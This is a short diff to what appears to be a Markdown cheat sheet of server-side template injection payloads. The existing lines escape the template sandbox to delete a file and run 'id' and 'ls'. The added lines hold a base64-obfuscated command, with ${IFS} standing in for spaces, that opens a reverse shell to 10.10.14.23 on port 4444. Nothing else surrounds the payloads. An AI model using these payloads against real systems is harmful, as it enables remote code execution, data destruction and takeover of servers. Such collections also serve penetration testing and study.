@@ -81,6 +81,9 @@ user.name}}{%25import+os%25}{{os.system('rm+/home/carlos/morale.txt')}}
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 
 {{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}}
+
+{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}YmFzaCAtaSA+JiAvZG
+V2L3RjcC8xMC4xMC4xNC4yMy80NDQ0IDA+JjE=${IFS}|base64${IFS}-d|bash').read()}}
 ```
 
 
